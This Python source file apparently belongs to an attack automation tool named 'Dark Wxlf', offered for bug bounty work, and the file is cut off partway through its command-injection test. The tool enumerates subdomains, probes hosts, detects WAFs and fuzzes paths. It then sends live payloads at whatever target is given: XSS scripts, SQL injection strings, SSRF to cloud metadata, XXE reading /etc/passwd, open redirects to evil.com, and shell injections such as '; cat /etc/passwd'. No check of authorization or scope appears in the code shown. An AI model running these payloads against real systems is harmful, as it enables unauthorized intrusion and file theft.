import subprocess
import requests
import json
import os
import sys
import socket
import re
from datetime import datetime
from termcolor import colored
from pyfiglet import Figlet
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import warnings
import base64
import hashlib
from urllib.parse import urlparse, parse_qs
import asyncio
import aiohttp
warnings.filterwarnings('ignore')

class DarkWxlf:
    def __init__(self):
        self.target = None
        self.subdomains = set()
        self.live = []
        self.endpoints = []
        self.tech = {}
        self.vulns = []
        self.data = {}
        self.output = None
        self.waf_detected = None
        self.fuzzed_paths = []
        self.use_nuclei = False
        self.use_fuzzing = False
        self.output_formats = ['txt']  # default text output
        
    def show_banner(self):
        os.system('clear')
        banner = Figlet(font='slant')
        print(colored(banner.renderText('Dark Wxlf'), 'red', attrs=['bold']))
        print(colored("╔═══════════════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║     Advanced Bug Bounty Automation Framework - By GhxstSh3ll         ║", 'red'))
        print(colored("║     Passive OSINT → Active Recon → Systematic Testing → Exploitation ║", 'red'))
        print(colored("╚═══════════════════════════════════════════════════════════════════════╝", 'red'))
        print()
        
    def log(self, msg, lvl="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        
        if lvl == "info":
            print(colored(f"[{ts}] [INFO] {msg}", 'cyan'))
        elif lvl == "success":
            print(colored(f"[{ts}] [✓] {msg}", 'green'))
        elif lvl == "warning":
            print(colored(f"[{ts}] [!] {msg}", 'yellow'))
        elif lvl == "error":
            print(colored(f"[{ts}] [✗] {msg}", 'red'))
        elif lvl == "phase":
            print(colored(f"\n{'='*75}", 'red'))
            print(colored(f"[PHASE] {msg}", 'red', attrs=['bold']))
            print(colored(f"{'='*75}\n", 'red'))
    
    def save_output(self, section, content):
        if not self.output:
            return
            
        with open(self.output, 'a') as f:
            f.write(f"\n{'='*80}\n{section}\n{'='*80}\n{content}\n")
    
    def passive_recon(self, domain):
        self.log("PHASE 1: PASSIVE OSINT (NO DIRECT TARGET CONTACT)", "phase")
        
        # Strip http/https and trailing slashes
        domain = domain.replace('http://', '').replace('https://', '').rstrip('/')
        
        self.target = domain
        self.output = f"dark_wxlf_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        self.log("Starting passive info gathering - this won't touch the target", "info")
        self.log("Passive recon is completely undetectable", "info")
        
        self.enum_subs()
        
        self.log(f"Phase 1 done: Found {len(self.subdomains)} subdomains", "success")
        
        summary = f"""
Target: {self.target}
Subdomains Found: {len(self.subdomains)}

All Subdomains:
{chr(10).join(sorted(self.subdomains))}
"""
        self.save_output("PHASE 1: PASSIVE OSINT RESULTS", summary)
    
    def enum_subs(self):
        self.log("Running subdomain enumeration from 4 sources", "info")
        self.log("Tools: Subfinder, Amass, crt.sh, HackerTarget", "info")
        
        def subfinder():
            try:
                self.log("Starting subfinder...", "info")
                r = subprocess.run(
                    f"subfinder -d {self.target} -silent",
                    shell=True, capture_output=True, text=True, timeout=180
                )
                if r.stdout:
                    results = set([s.strip() for s in r.stdout.strip().split('\n') if s.strip()])
                    self.log(f"Subfinder got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"Subfinder error: {str(e)[:50]}", "error")
            return set()
        
        def amass_scan():
            try:
                self.log("Starting amass passive mode...", "info")
                r = subprocess.run(
                    f"amass enum -d {self.target} -passive -timeout 3",
                    shell=True, capture_output=True, text=True, timeout=180
                )
                if r.stdout:
                    results = set([s.strip() for s in r.stdout.strip().split('\n') if s.strip()])
                    self.log(f"Amass got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"Amass error: {str(e)[:50]}", "error")
            return set()
        
        def crtsh():
            try:
                self.log("Checking Certificate Transparency logs...", "info")
                resp = requests.get(
                    f"https://crt.sh/?q=%.{self.target}&output=json",
                    timeout=30
                )
                if resp.status_code == 200:
                    data = resp.json()
                    results = set()
                    for cert in data:
                        name = cert.get('name_value', '')
                        for sub in name.split('\n'):
                            sub = sub.strip().replace('*.', '')
                            if sub and self.target in sub:
                                results.add(sub)
                    self.log(f"crt.sh got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"crt.sh error: {str(e)[:50]}", "error")
            return set()
        
        def hackertarget():
            try:
                self.log("Querying HackerTarget...", "info")
                resp = requests.get(
                    f"https://api.hackertarget.com/hostsearch/?q={self.target}",
                    timeout=15
                )
                if resp.status_code == 200:
                    results = set()
                    for line in resp.text.split('\n'):
                        if ',' in line:
                            sub = line.split(',')[0].strip()
                            if sub and self.target in sub:
                                results.add(sub)
                    self.log(f"HackerTarget got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"HackerTarget error: {str(e)[:50]}", "error")
            return set()
        
        # run everything at once
        with ThreadPoolExecutor(max_workers=4) as ex:
            jobs = {
                ex.submit(subfinder): 'Subfinder',
                ex.submit(amass_scan): 'Amass',
                ex.submit(crtsh): 'crt.sh',
                ex.submit(hackertarget): 'HackerTarget'
            }
            
            for job in as_completed(jobs):
                res = job.result()
                self.subdomains.update(res)
        
        self.log(f"Total unique: {len(self.subdomains)} subdomains", "success")
    
    def active_recon(self):
        self.log("PHASE 2: ACTIVE RECONNAISSANCE (TOUCHING TARGET)", "phase")
        self.log("Warning: This will show up in target's logs", "warning")
        
        confirm = input(colored("\n[?] Continue with active recon? (yes/no): ", 'yellow'))
        if confirm.lower() != 'yes':
            self.log("Skipping active recon", "warning")
            return
        
        self.log("Starting active scanning...", "info")
        self.check_live()
        self.find_webapps()
        
        self.log("Phase 2 complete", "success")
        
        summary = f"""
Live Hosts: {len(self.live)}
Web Apps: {len(self.data.get('web_apps', []))}

Live Hosts:
{chr(10).join([f"{h['sub']} -> {h['ip']}" for h in self.live])}
"""
        self.save_output("PHASE 2: ACTIVE RECON RESULTS", summary)
    
    def check_live(self):
        self.log("Checking which hosts are actually live...", "info")
        
        cnt = 0
        with ThreadPoolExecutor(max_workers=50) as ex:
            def check(sub):
                try:
                    ip = socket.gethostbyname(sub)
                    return {'sub': sub, 'ip': ip}
                except:
                    return None
            
            jobs = [ex.submit(check, s) for s in self.subdomains]
            
            for job in as_completed(jobs):
                res = job.result()
                if res:
                    self.live.append(res)
                    cnt += 1
        
        self.log(f"Found {len(self.live)} live hosts", "success")
    
    def find_webapps(self):
        self.log("Looking for web applications...", "info")
        
        apps = []
        with ThreadPoolExecutor(max_workers=30) as ex:
            def probe(host):
                sub = host['sub']
                results = []
                
                for scheme in ['https', 'http']:
                    try:
                        url = f"{scheme}://{sub}"
                        r = requests.get(url, timeout=5, allow_redirects=True, verify=False)
                        
                        if r.status_code < 500:
                            results.append({
                                'url': url,
                                'status': r.status_code,
                                'title': self.get_title(r.text),
                                'server': r.headers.get('Server', 'Unknown'),
                                'headers': dict(r.headers)
                            })
                    except:
                        pass
                
                return results
            
            jobs = [ex.submit(probe, h) for h in self.live]
            
            for job in as_completed(jobs):
                res = job.result()
                if res:
                    apps.extend(res)
        
        self.data['web_apps'] = apps
        self.log(f"Found {len(apps)} web applications", "success")
    
    def get_title(self, html):
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1).strip()[:100]
        return "No title"
    
    def analyze(self):
        self.log("PHASE 3: ANALYZING TARGET", "phase")
        
        self.log("Running tech detection...", "info")
        
        for app in self.data.get('web_apps', []):
            url = app['url']
            
            try:
                r = requests.get(url, timeout=10, verify=False)
                
                # check headers for tech
                headers = r.headers
                server = headers.get('Server', '').lower()
                xpowered = headers.get('X-Powered-By', '').lower()
                
                techs = []
                
                if 'nginx' in server:
                    techs.append('Nginx')
                if 'apache' in server:
                    techs.append('Apache')
                if 'cloudflare' in server:
                    techs.append('Cloudflare')
                if 'php' in xpowered:
                    techs.append('PHP')
                if 'asp.net' in xpowered:
                    techs.append('ASP.NET')
                
                # check body for frameworks
                body = r.text.lower()
                
                if 'wordpress' in body or 'wp-content' in body:
                    techs.append('WordPress')
                if 'joomla' in body:
                    techs.append('Joomla')
                if 'drupal' in body:
                    techs.append('Drupal')
                if 'react' in body or 'reactjs' in body:
                    techs.append('React')
                if 'angular' in body or 'ng-app' in body:
                    techs.append('Angular')
                if 'vue' in body or 'vuejs' in body:
                    techs.append('Vue.js')
                
                self.tech[url] = techs
                
            except Exception as e:
                pass
        
        self.log("Tech detection complete", "success")
        
        # crawl for endpoints
        self.log("Crawling for endpoints...", "info")
        
        for app in self.data.get('web_apps', []):
            url = app['url']
            
            try:
                r = requests.get(url, timeout=10, verify=False)
                
                # find links
                links = re.findall(r'href=["\'](.*?)["\']', r.text)
                
                for link in links:
                    if link.startswith('http'):
                        self.endpoints.append(link)
                    elif link.startswith('/'):
                        self.endpoints.append(f"{url}{link}")
                
            except:
                pass
        
        self.endpoints = list(set(self.endpoints))[:100]  # limit to first 100
        
        self.log(f"Found {len(self.endpoints)} endpoints", "success")
    
    def detect_waf(self):
        """Check if there's a WAF protecting the target"""
        self.log("Checking for WAF/CDN protection...", "info")
        
        waf_signatures = {
            'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id'],
            'Akamai': ['akamai', 'x-akamai'],
            'Imperva': ['incap_ses', 'visid_incap'],
            'Sucuri': ['x-sucuri-id', 'sucuri'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'F5 BIG-IP': ['BigIP', 'F5', 'TS01'],
            'Barracuda': ['barra_counter_session'],
            'Fortinet': ['fortigate', 'fortiwasd_cookie']
        }
        
        detected = []
        
        for app in self.data.get('web_apps', [])[:5]:  # check first 5 apps
            url = app['url']
            
            try:
                # send suspicious request to trigger WAF
                r = requests.get(
                    url + "?id=1'OR'1'='1",
                    headers={'User-Agent': 'sqlmap/1.0'},
                    timeout=5,
                    verify=False
                )
                
                # check headers and body for WAF signatures
                headers_str = ' '.join([f"{k}:{v}" for k,v in r.headers.items()]).lower()
                body = r.text.lower()
                combined = headers_str + ' ' + body
                
                for waf, sigs in waf_signatures.items():
                    if any(sig.lower() in combined for sig in sigs):
                        if waf not in detected:
                            detected.append(waf)
                            self.log(f"WAF detected: {waf}", "warning")
                
                # check for generic WAF behavior
                if r.status_code in [403, 406, 419, 429, 503]:
                    if 'blocked' in body or 'forbidden' in body or 'access denied' in body:
                        if 'Generic WAF' not in detected:
                            detected.append('Generic WAF')
                            self.log("Generic WAF behavior detected", "warning")
                            
            except:
                pass
        
        if detected:
            self.waf_detected = detected
            self.log(f"WAF/Protection: {', '.join(detected)}", "warning")
            self.log("Note: Some tests might be blocked by WAF", "warning")
        else:
            self.log("No WAF detected - full testing possible", "success")
            self.waf_detected = None
    
    def run_fuzzing(self):
        """Fuzz for hidden directories and files using ffuf"""
        self.log("Starting directory/file fuzzing with ffuf...", "info")
        
        # check if ffuf is installed
        try:
            subprocess.run(['ffuf', '-h'], capture_output=True, timeout=2)
        except:
            self.log("ffuf not installed - skipping fuzzing", "error")
            self.log("Install: go install github.com/ffuf/ffuf@latest", "info")
            return
        
        wordlist_paths = [
            '/usr/share/wordlists/dirb/common.txt',
            '/usr/share/seclists/Discovery/Web-Content/common.txt',
            '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt'
        ]
        
        wordlist = None
        for path in wordlist_paths:
            if os.path.exists(path):
                wordlist = path
                break
        
        if not wordlist:
            self.log("No wordlist found - skipping fuzzing", "warning")
            return
        
        self.log(f"Using wordlist: {wordlist}", "info")
        
        # fuzz first few web apps
        for app in self.data.get('web_apps', [])[:3]:  # limit to 3 to save time
            url = app['url']
            
            self.log(f"Fuzzing: {url}", "info")
            
            try:
                # run ffuf
                cmd = f'ffuf -u {url}/FUZZ -w {wordlist} -mc 200,204,301,302,307,401,403 -fs 0 -t 50 -timeout 3 -silent'
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                if result.stdout:
                    # parse ffuf output
                    for line in result.stdout.split('\n'):
                        if url in line:
                            # extract the found path
                            match = re.search(r'(https?://[^\s]+)', line)
                            if match:
                                found_url = match.group(1)
                                self.fuzzed_paths.append(found_url)
                                self.endpoints.append(found_url)
                
                self.log(f"Found {len([p for p in self.fuzzed_paths if url in p])} new paths", "success")
                
            except subprocess.TimeoutExpired:
                self.log(f"Fuzzing timeout for {url}", "warning")
            except Exception as e:
                self.log(f"Fuzzing error: {str(e)[:50]}", "error")
        
        if self.fuzzed_paths:
            self.log(f"Total fuzzed paths discovered: {len(self.fuzzed_paths)}", "success")
    
    def run_nuclei(self):
        """Run nuclei vulnerability scanner"""
        self.log("Starting Nuclei vulnerability scan...", "info")
        
        # check if nuclei is installed
        try:
            subprocess.run(['nuclei', '-version'], capture_output=True, timeout=2)
        except:
            self.log("Nuclei not installed - skipping", "error")
            self.log("Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", "info")
            return []
        
        findings = []
        
        # create temp file with URLs
        url_file = '/tmp/dark_wxlf_urls.txt'
        with open(url_file, 'w') as f:
            for app in self.data.get('web_apps', []):
                f.write(app['url'] + '\n')
        
        self.log(f"Running Nuclei on {len(self.data.get('web_apps', []))} targets...", "info")
        self.log("This might take a few minutes...", "info")
        
        try:
            # run nuclei with common templates
            cmd = f'nuclei -l {url_file} -silent -json -severity critical,high,medium -timeout 10 -retries 1'
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300  # 5 min timeout
            )
            
            if result.stdout:
                # parse JSON output
                for line in result.stdout.strip().split('\n'):
                    try:
                        data = json.loads(line)
                        
                        vuln = {
                            'type': f"Nuclei: {data.get('info', {}).get('name', 'Unknown')}",
                            'severity': data.get('info', {}).get('severity', 'UNKNOWN').upper(),
                            'url': data.get('host', ''),
                            'param': data.get('matched-at', ''),
                            'payload': data.get('template-id', ''),
                            'evidence': data.get('matcher-name', 'Nuclei detection'),
                            'impact': data.get('info', {}).get('description', 'See Nuclei template'),
                            'fix': data.get('info', {}).get('remediation', 'Check vendor documentation'),
                            'poc': self.nuclei_poc(data),
                            'cvss': 'N/A'
                        }
                        findings.append(vuln)
                        self.log(f"Nuclei found: {vuln['type']}", "success")
                        
                    except json.JSONDecodeError:
                        pass
            
            self.log(f"Nuclei scan complete: {len(findings)} findings", "success")
            
        except subprocess.TimeoutExpired:
            self.log("Nuclei scan timeout - results may be incomplete", "warning")
        except Exception as e:
            self.log(f"Nuclei error: {str(e)[:50]}", "error")
        finally:
            # cleanup
            if os.path.exists(url_file):
                os.remove(url_file)
        
        return findings
    
    def advanced_recon_menu(self):
        """Ask user what advanced recon they want"""
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                  ADVANCED RECON OPTIONS                        ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        print(colored("Available Options:", 'cyan', attrs=['bold']))
        print(colored("  [1] WAF Detection", 'white') + colored(" - Identify protection mechanisms", 'yellow'))
        print(colored("  [2] Directory Fuzzing (ffuf)", 'white') + colored(" - Find hidden paths/files", 'yellow'))
        print(colored("  [3] Nuclei Scanner", 'white') + colored(" - 1000s of vuln templates", 'yellow'))
        print()
        print(colored("Quick Options:", 'yellow'))
        print(colored("  [all]  Run all advanced recon", 'green'))
        print(colored("  [skip] Skip advanced recon", 'red'))
        print()
        
        choice = input(colored("[?] Select options (comma-separated) or quick option: ", 'yellow')).strip().lower()
        
        if choice == 'skip':
            self.log("Skipping advanced recon", "info")
            return
        
        run_waf = False
        run_fuzz = False
        run_nuclei = False
        
        if choice == 'all':
            run_waf = True
            run_fuzz = True
            run_nuclei = True
        else:
            opts = [o.strip() for o in choice.split(',')]
            if '1' in opts:
                run_waf = True
            if '2' in opts:
                run_fuzz = True
            if '3' in opts:
                run_nuclei = True
        
        # run selected options
        if run_waf:
            self.detect_waf()
        
        if run_fuzz:
            self.run_fuzzing()
        
        if run_nuclei:
            self.use_nuclei = True
    
    def output_format_menu(self):
        """Ask what output formats they want"""
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                    OUTPUT FORMAT OPTIONS                       ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        print(colored("Available Formats:", 'cyan', attrs=['bold']))
        print(colored("  [1] TXT Report", 'white') + colored(" - Human-readable text", 'yellow'))
        print(colored("  [2] JSON Output", 'white') + colored(" - Machine-readable for tools", 'yellow'))
        print(colored("  [3] HTML Report", 'white') + colored(" - Web-based visual report", 'yellow'))
        print()
        print(colored("Quick Options:", 'yellow'))
        print(colored("  [all]  Generate all formats", 'green'))
        print()
        
        choice = input(colored("[?] Select formats (comma-separated) or 'all': ", 'yellow')).strip().lower()
        
        self.output_formats = []
        
        if choice == 'all':
            self.output_formats = ['txt', 'json', 'html']
        else:
            opts = [o.strip() for o in choice.split(',')]
            if '1' in opts or not opts:
                self.output_formats.append('txt')
            if '2' in opts:
                self.output_formats.append('json')
            if '3' in opts:
                self.output_formats.append('html')
        
        if not self.output_formats:
            self.output_formats = ['txt']  # default
        
        self.log(f"Will generate: {', '.join([f.upper() for f in self.output_formats])}", "success")
    
    def select_tests(self):
        """Let user pick which vulnerability tests to run"""
        
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║              SELECT VULNERABILITY TESTS TO RUN                 ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        # all available tests with descriptions
        tests = {
            '1': {'name': 'XSS (Cross-Site Scripting)', 'func': self.test_xss, 'severity': 'HIGH'},
            '2': {'name': 'SQL Injection', 'func': self.test_sqli, 'severity': 'CRITICAL'},
            '3': {'name': 'IDOR (Broken Access)', 'func': self.test_idor, 'severity': 'HIGH'},
            '4': {'name': 'SSRF (Server-Side Request Forgery)', 'func': self.test_ssrf, 'severity': 'CRITICAL'},
            '5': {'name': 'Open Redirect', 'func': self.test_open_redirect, 'severity': 'MEDIUM'},
            '6': {'name': 'XXE (XML External Entity)', 'func': self.test_xxe, 'severity': 'CRITICAL'},
            '7': {'name': 'Command Injection', 'func': self.test_cmd_injection, 'severity': 'CRITICAL'},
            '8': {'name': 'Path Traversal / LFI', 'func': self.test_path_traversal, 'severity': 'HIGH'},
            '9': {'name': 'Sensitive File Exposure', 'func': self.test_sensitive_files, 'severity': 'HIGH'},
            '10': {'name': 'CORS Misconfiguration', 'func': self.test_cors, 'severity': 'MEDIUM'},
            '11': {'name': 'Missing Security Headers', 'func': self.test_security_headers, 'severity': 'LOW'},
            '12': {'name': 'Rate Limiting Issues', 'func': self.test_rate_limiting, 'severity': 'MEDIUM'},
            '13': {'name': 'CRLF Injection', 'func': self.test_crlf, 'severity': 'MEDIUM'},
            '14': {'name': 'GraphQL Introspection', 'func': self.test_graphql, 'severity': 'MEDIUM'},
            '15': {'name': 'JWT Vulnerabilities', 'func': self.test_jwt, 'severity': 'HIGH'},
            '16': {'name': 'Subdomain Takeover', 'func': self.test_subdomain_takeover, 'severity': 'HIGH'},
            '17': {'name': 'SSTI (Template Injection)', 'func': self.test_ssti, 'severity': 'CRITICAL'},
            '18': {'name': 'Host Header Injection', 'func': self.test_host_header, 'severity': 'MEDIUM'},
            '19': {'name': 'WebSocket Security', 'func': self.test_websocket, 'severity': 'MEDIUM'}
        }
        
        # display the menu
        print(colored("Available Tests:", 'cyan', attrs=['bold']))
        print()
        
        for num, info in sorted(tests.items(), key=lambda x: int(x[0])):
            sev_color = {
                'CRITICAL': 'red',
                'HIGH': 'yellow', 
                'MEDIUM': 'cyan',
                'LOW': 'white'
            }.get(info['severity'], 'white')
            
            print(colored(f"  [{num:>2}] {info['name']:<40}", 'white') + 
                  colored(f" [{info['severity']}]", sev_color, attrs=['bold']))
        
        print()
        print(colored("Quick Options:", 'yellow'))
        print(colored("  [all]      Run ALL tests (recommended)", 'green'))
        print(colored("  [critical] Run only CRITICAL severity tests", 'red'))
        print(colored("  [quick]    Run fast tests only (XSS, SQLi, IDOR, Files)", 'cyan'))
        print()
        
        choice = input(colored("[?] Enter test numbers (comma-separated), or option: ", 'yellow')).strip().lower()
        
        selected = []
        
        if choice == 'all':
            selected = list(tests.values())
            self.log("Running ALL vulnerability tests", "success")
        
        elif choice == 'critical':
            selected = [t for t in tests.values() if t['severity'] == 'CRITICAL']
            self.log(f"Running {len(selected)} CRITICAL tests", "success")
        
        elif choice == 'quick':
            # fast tests that don't take long
            quick_nums = ['1', '2', '3', '9']
            selected = [tests[n] for n in quick_nums]
            self.log("Running quick scan (4 tests)", "success")
        
        else:
            # parse comma-separated numbers
            nums = [n.strip() for n in choice.split(',')]
            for n in nums:
                if n in tests:
                    selected.append(tests[n])
                else:
                    self.log(f"Invalid test number: {n}", "warning")
            
            if not selected:
                self.log("No valid tests selected, running ALL by default", "warning")
                selected = list(tests.values())
        
        return selected
    
    def test_vulns(self):
        self.log("PHASE 4: VULNERABILITY TESTING", "phase")
        
        # let user select which tests to run
        selected_tests = self.select_tests()
        
        if not selected_tests:
            self.log("No tests selected, exiting", "error")
            return
        
        print()
        self.log(f"Starting {len(selected_tests)} vulnerability tests...", "info")
        print()
        
        findings = []
        
        # run each selected test
        for test in selected_tests:
            try:
                results = test['func']()
                findings.extend(results)
            except Exception as e:
                self.log(f"Error in {test['name']}: {str(e)[:50]}", "error")
        
        # run nuclei if enabled
        if self.use_nuclei:
            print()
            nuclei_findings = self.run_nuclei()
            findings.extend(nuclei_findings)
        
        self.vulns = findings
        
        self.log(f"Testing complete: {len(findings)} vulnerabilities found", "success")
        
        self.make_report(findings)
    
    def test_xss(self):
        self.log("Testing for XSS vulnerabilities...", "info")
        
        found = []
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>'
        ]
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                for payload in payloads:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        r = requests.get(test_url, timeout=5, verify=False)
                        
                        if payload in r.text:
                            vuln = {
                                'type': 'XSS (Reflected)',
                                'severity': 'HIGH',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': f'Payload reflected in response',
                                'impact': 'Account takeover, session hijacking, credential theft',
                                'fix': 'Encode user input, implement CSP headers',
                                'poc': self.xss_poc(test_url, param, payload),
                                'cvss': '7.1 HIGH'
                            }
                            found.append(vuln)
                            self.log(f"XSS found: {base}", "success")
                            break
                    except:
                        pass
        
        self.log(f"XSS tests done: {len(found)} findings", "success")
        return found
    
    def test_sqli(self):
        self.log("Testing for SQL injection...", "info")
        
        found = []
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1' AND 1=1--",
            "' UNION SELECT NULL--"
        ]
        
        sql_errors = [
            'sql syntax',
            'mysql',
            'postgresql',
            'sqlite',
            'ora-',
            'syntax error',
            'unclosed quotation'
        ]
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                for payload in payloads:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        r = requests.get(test_url, timeout=5, verify=False)
                        
                        for err in sql_errors:
                            if err in r.text.lower():
                                vuln = {
                                    'type': 'SQL Injection',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': f'SQL error detected: {err}',
                                    'impact': 'Full database compromise, data exfiltration',
                                    'fix': 'Use parameterized queries/prepared statements',
                                    'poc': self.sqli_poc(test_url, param, payload),
                                    'cvss': '9.8 CRITICAL'
                                }
                                found.append(vuln)
                                self.log(f"SQLi found: {base}", "success")
                                break
                    except:
                        pass
        
        self.log(f"SQLi tests done: {len(found)} findings", "success")
        return found
    
    def test_idor(self):
        self.log("Testing for IDOR vulnerabilities...", "info")
        
        found = []
        idor_params = ['id', 'user', 'userid', 'account', 'uid', 'profile']
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                if any(p in param.lower() for p in idor_params):
                    try:
                        vuln = {
                            'type': 'IDOR (Insecure Direct Object Reference)',
                            'severity': 'HIGH',
                            'url': ep,
                            'param': param,
                            'payload': 'Sequential ID manipulation',
                            'evidence': f'Parameter {param} may allow unauthorized access',
                            'impact': 'Unauthorized data access, PII exposure',
                            'fix': 'Implement proper authorization checks',
                            'poc': self.idor_poc(ep, param),
                            'cvss': '7.5 HIGH'
                        }
                        found.append(vuln)
                        self.log(f"Potential IDOR: {ep.split('?')[0]}", "success")
                        break
                    except:
                        pass
        
        self.log(f"IDOR tests done: {len(found)} findings", "success")
        return found
    
    def test_ssrf(self):
        self.log("Testing for SSRF vulnerabilities...", "info")
        
        found = []
        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'api', 'callback']
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd'
        ]
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                if any(p in param.lower() for p in ssrf_params):
                    for payload in ssrf_payloads:
                        try:
                            base = ep.split('?')[0]
                            test_url = f"{base}?{param}={payload}"
                            
                            vuln = {
                                'type': 'SSRF (Server-Side Request Forgery)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': f'Parameter {param} may allow internal requests',
                                'impact': 'Internal network access, cloud metadata exposure',
                                'fix': 'Whitelist allowed domains, block private IPs',
                                'poc': self.ssrf_poc(test_url, param, payload),
                                'cvss': '9.1 CRITICAL'
                            }
                            found.append(vuln)
                            self.log(f"SSRF potential: {base}", "success")
                            break
                        except:
                            pass
        
        self.log(f"SSRF tests done: {len(found)} findings", "success")
        return found
    
    def test_open_redirect(self):
        self.log("Testing for open redirect...", "info")
        
        found = []
        redir_params = ['url', 'next', 'redirect', 'return', 'goto', 'callback', 'continue']
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                if any(rp in param.lower() for rp in redir_params):
                    base = ep.split('?')[0]
                    turl = f"{base}?{param}=https://evil.com"
                    
                    vuln = {
                        'type': 'Open Redirect',
                        'severity': 'MEDIUM',
                        'url': turl,
                        'param': param,
                        'payload': 'https://evil.com',
                        'evidence': f'Redirect param {param} detected',
                        'impact': 'Phishing, credential theft',
                        'fix': 'Whitelist redirect destinations',
                        'poc': self.redir_poc(turl, param),
                        'cvss': '6.1 MEDIUM'
                    }
                    found.append(vuln)
                    self.log(f"Redirect potential: {base}", "success")
                    break
        
        self.log(f"Redirect tests done: {len(found)} findings", "success")
        return found
    
    # NEW VULNERABILITY TESTS START HERE
    
    def test_xxe(self):
        self.log("Testing for XXE (XML External Entity)...", "info")
        
        found = []
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>'''
        
        for app in self.data.get('web_apps', [])[:20]:
            url = app['url']
            
            # check if app accepts XML
            try:
                r = requests.post(
                    url + '/api/test',
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=5,
                    verify=False
                )
                
                # look for signs of XXE
                if 'root:' in r.text or '/bin/bash' in r.text or 'daemon' in r.text:
                    vuln = {
                        'type': 'XXE (XML External Entity)',
                        'severity': 'CRITICAL',
                        'url': url,
                        'param': 'XML body',
                        'payload': xxe_payload,
                        'evidence': 'File contents leaked in response',
                        'impact': 'File disclosure, SSRF, RCE potential',
                        'fix': 'Disable external entities in XML parser',
                        'poc': self.xxe_poc(url),
                        'cvss': '9.1 CRITICAL'
                    }
                    found.append(vuln)
                    self.log(f"XXE found: {url}", "success")
            except:
                pass
            
            # also check common API endpoints
            common_xml_eps = ['/api/upload', '/api/parse', '/upload', '/xml']
            for ep in common_xml_eps:
                try:
                    test = url + ep
                    r = requests.post(
                        test,
                        data=xxe_payload,
                        headers={'Content-Type': 'text/xml'},
                        timeout=5,
                        verify=False
                    )
                    
                    if r.status_code == 200 and 'root:' in r.text:
                        vuln = {
                            'type': 'XXE (XML External Entity)',
                            'severity': 'CRITICAL',
                            'url': test,
                            'param': 'XML body',
                            'payload': xxe_payload,
                            'evidence': '/etc/passwd contents exposed',
                            'impact': 'File read, SSRF, potential RCE',
                            'fix': 'Disable DTD processing completely',
                            'poc': self.xxe_poc(test),
                            'cvss': '9.8 CRITICAL'
                        }
                        found.append(vuln)
                        self.log(f"XXE at endpoint: {test}", "success")
                except:
                    pass
        
        self.log(f"XXE tests done: {len(found)} findings", "success")
        return found
    
    def test_cmd_injection(self):
        self.log("Testing for command injection...", "info")
        
        found = []
        # payloads that might trigger cmd injection
        cmd_payloads = [
            '; ls',
            '| whoami',
            '&& id',
            '`ping -c 1 127.0.0.1`',
            '$(sleep 5)',
            '; cat /etc/passwd'
        ]
        
        # params that commonly have cmd injection
        cmd_params = ['cmd', 'exec', 'command', 'ping', 'ip', 'host']
        
        for ep in self.endpoints[:25]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                # check suspicious param names
                if any(cp in param.lower() for cp in cmd_params):
                    for payload in cmd_payloads:
                        try:
                            base = ep.split('?')[0]
                            test_url = f"{base}?{param}={payload}"
                            
                            start = time.time()
